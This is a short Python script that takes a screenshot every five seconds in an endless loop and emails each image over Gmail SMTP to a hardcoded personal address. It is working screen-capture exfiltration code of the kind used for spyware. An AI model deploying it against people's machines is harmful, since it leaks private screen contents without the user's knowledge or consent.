import smtplib
import os
import imghdr
from email.message import EmailMessage
import pyautogui
import time

rec = 'aninhassan160@gmail.com'
sender = os.environ.get('DB_USER')
passw =os.environ.get('DB_PASS')

flag = True
i = 0
while (flag == True):
    time.sleep(5)
    picture = pyautogui.screenshot("fine.jpg")
    print("Screenshot Done: " , i)
    x = open("fine.jpg","rb")
    f = x.read()
    name = x.name
    msg = EmailMessage()
    msg['Subject'] = "This is a test email!"
    msg.set_content(f"Sending Screenshot!{i}")
    msg['From'] = sender
    msg['To'] = rec
    with open(name,'rb') as pic:
        file = pic.read()
        file_name = pic.name
        file_type = imghdr.what(pic.name)
        msg.add_attachment(file, maintype = 'image', subtype = file_type , filename = file_name)
    try:
        obj = smtplib.SMTP('smtp.gmail.com',587)
        obj.starttls()
        obj.login(sender,passw)
        obj.send_message(msg)
        i = i+1
        print("Sent : ", i)
    except:
        print("ERROR")
